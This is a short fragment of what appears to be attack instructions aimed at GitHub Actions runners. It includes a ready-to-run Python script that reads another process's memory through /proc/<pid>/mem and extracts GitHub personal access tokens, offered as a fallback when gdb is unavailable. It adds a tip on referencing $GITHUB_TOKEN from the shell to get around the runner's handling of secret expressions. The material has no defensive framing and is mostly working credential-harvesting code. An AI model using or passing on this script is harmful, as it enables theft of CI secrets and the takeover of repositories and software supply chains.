Fallback — Python /proc/mem reader: If gdb cannot be installed (e.g., restricted package manager, read-only filesystem), use this pure-Python alternative that reads directly from /proc/<pid>/mem. Save as /tmp/memdump.py and run with the target PID. 
import re, sys
pid = int(sys.argv[1])
maps = open(f'/proc/{pid}/maps').read()
mem = open(f'/proc/{pid}/mem', 'rb')
for line in maps.split('\n'):
    m = re.match(r'([0-9a-f]+)-([0-9a-f]+)', line)
    if m:
        start, end = int(m.group(1), 16), int(m.group(2), 16)
        if end - start > 10*1024*1024: continue  # skip huge regions
        try:
            mem.seek(start)
            chunk = mem.read(end - start)
            for tok in re.findall(b'ghp_[a-zA-Z0-9]{36}', chunk):
                print(tok.decode())
        except:
            pass

Why $GITHUB_TOKEN and not ${{ secrets.GITHUB_TOKEN }}: Expression syntax (${{ secrets.* }}) is resolved by the GitHub Actions runner engine before the shell ever executes the step. Injecting ${{ secrets.GITHUB_TOKEN }} into an expression-interpolated field will not work — the runner sanitizes secret expressions in user-controlled contexts.
